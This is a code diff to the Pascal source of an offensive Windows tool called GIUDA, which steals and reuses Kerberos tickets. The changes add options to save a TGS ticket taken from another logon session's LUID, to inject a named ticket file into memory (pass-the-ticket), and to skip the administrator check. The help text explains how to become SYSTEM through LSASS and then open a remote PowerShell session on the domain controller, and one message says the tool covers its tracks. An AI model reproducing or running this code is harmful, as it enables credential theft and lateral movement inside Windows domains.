@@ -5,9 +5,10 @@ uses sysutils,windows,classes,uadvapi32,kerberos,usecur32,upsapi;
 
 var
   ret,parampos:dword;
-  luid,pid,params:string;
+  ticket,luid,pid,params:string;
   dw,inhandle:dword;
   pb:pbyte;
+  save:boolean=false;
 
 
 
@@ -59,11 +60,11 @@ begin
    getmem(sysdir,Max_Path );
    GetSystemDirectory(sysdir, MAX_PATH - 1);
    debugpriv:=EnableDebugPriv('SeDebugPrivilege');
-   if not debugpriv then
+   if (not debugpriv) and (pos('-ptt',cmdline)=0) then
      begin
       writeln('You need Administrative privileges');
       writeln('Aborting...');
-      exit;
+      //exit;
      end;
   end;
 
@@ -79,22 +80,26 @@ begin
    writeln();
    verbose('To ask a TGS',1);
    verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:LDAP/DCNAME',1);
-   verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:HTTP/DCNAME',1);
+   verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:HTTP/DCNAME -save',1);
    writeln();
    verbose('Example:',1);
    verbose('-runaslsass => to become SYSTEM',1);
    verbose('-askluids => to get all LUIDs',1);
-   verbose('-gettgs and -luid:0xNNNNN and -msdsspn:HTTP/DCNAME => to get a tgs',1);
+   verbose('-gettgs and -luid:0xNNNNN and -msdsspn:HTTP/DCNAME => to get and PASS a tgs',1);
+   verbose('-gettgs and -luid:0xNNNNN and -msdsspn:HTTP/DCNAME -save => to get and SAVE a tgs',1);
    verbose('Open a Powershell and...',1);
    verbose('[PS] C:\> Enter-PSsession -computername DCNAME',1);
    verbose('Enjoy GIUDA',1);
   end;
+
+
 
   parampos:=pos('-msdsspn',cmdline);
   if parampos>0 then
        begin
         params:=copy(cmdline,parampos,strlen(cmdline));
         params:=stringreplace(params,'-msdsspn:','',[rfReplaceAll, rfIgnoreCase]);
+        if pos(' ',params)>0 then params:=copy(params,0,pos(' ',params)-1);
        end;
 
   parampos:=pos('-runaspid',cmdline);
@@ -113,6 +118,18 @@ begin
          else verbose('Error, not good...',1);
      end;
 
+  parampos:=pos('-ticket',cmdline);
+  if parampos>0 then
+     begin
+      ticket:=copy(cmdline,parampos,strlen(cmdline));
+      ticket:=stringreplace(ticket,'-ticket:','',[rfReplaceAll, rfIgnoreCase]);
+      if pos(' ',ticket)>0 then ticket:=copy(ticket,0,pos(' ',ticket)-1);
+      if ticket='' then
+         begin
+          verbose('Check your syntax, TICKET is empty',1);
+          exit;
+         end;
+     end;
 
   parampos:=pos('-runaslsass',cmdline);
   if parampos>0 then
@@ -129,6 +146,12 @@ begin
        luid:=copy(cmdline,parampos,255);
        luid:=stringreplace(luid,'-luid:','',[rfReplaceAll, rfIgnoreCase]);
        delete(luid,pos(' ',luid),255);
+  end;
+
+  parampos:=pos('-save',cmdline);
+  if parampos>0 then
+  begin
+       save:=true;
   end;
 
   parampos:=pos('-gettgs',cmdline);
@@ -148,8 +171,52 @@ begin
        verbose('[!] Giuda spilled the name',1);
        kuhl_m_kerberos_clean ;
       end;
+   if not save then
+      begin
+       inhandle:=thandle(-1);
+       inhandle := CreateFile(pchar('ticket.kirbi'), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+       dw := GetFileSize(inhandle,nil)  ;
+       pb:=allocmem(dw);ret:=0;
+       if inhandle<>thandle(-1) then
+        begin
+         verbose('Loading TGS',1);
+         ReadFile(inhandle,pb^,dw,ret,nil);
+        end;
+       if inhandle<>thandle(-1) then closehandle(inhandle);
+       if (ret<>0) then
+        begin
+         if kuhl_m_kerberos_init=0 then
+          begin
+           kuhl_m_kerberos_use_ticket(pb,ret,0);
+           verbose('[!] Giuda collects the coins and Pass the Ticket',1);
+           kuhl_m_kerberos_clean ;
+          end;
+         end;
+        deletefile('ticket.kirbi');
+        verbose('[!] Giuda betrayed and covered tracks',1);
+
+      end
+   else verbose('Ticket saved as TICKET.KIRBI',1);
+
+  end;
+
+  parampos:=pos('-ptt',cmdline);
+  if parampos>0 then
+   begin
+   if ticket='' then
+      begin
+       verbose('Please specify a TICKET file',1);
+       exit;
+      end;
+   if not FileExists(ticket) then
+      begin
+       verbose('Ticket file '+ticket+' doesn''t exists',1);
+       verbose('Please check filename',1);
+       exit;
+      end;
+   verbose('[!] Giuda accepted few coins',1);
    inhandle:=thandle(-1);
-   inhandle := CreateFile(pchar('ticket.kirbi'), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+   inhandle := CreateFile(pchar(ticket), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    dw := GetFileSize(inhandle,nil)  ;
    pb:=allocmem(dw);ret:=0;
    if inhandle<>thandle(-1) then
@@ -167,7 +234,7 @@ begin
          kuhl_m_kerberos_clean ;
         end;
      end;
-    deletefile('ticket.kirbi');
+    verbose('Ticket loaded in memory',1);
     verbose('[!] Giuda betrayed',1);
    end;
 
